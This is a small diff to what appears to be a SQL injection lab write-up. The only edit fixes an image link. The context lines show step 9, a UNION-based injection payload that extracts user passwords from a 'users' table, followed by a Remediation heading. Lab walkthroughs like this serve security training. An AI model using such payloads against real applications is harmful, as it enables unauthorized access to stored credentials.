@@ -31,7 +31,7 @@
 ![payload output](DB%20schema%20low.png)
 9. run the following command to get the passwords of the users
 	``1' UNION SELECT 1, password FROM users#``
-	![payload output for passwords](password%20low) 
+	![payload output for passwords](password%20low.png) 
 
 **Remediation:**
 
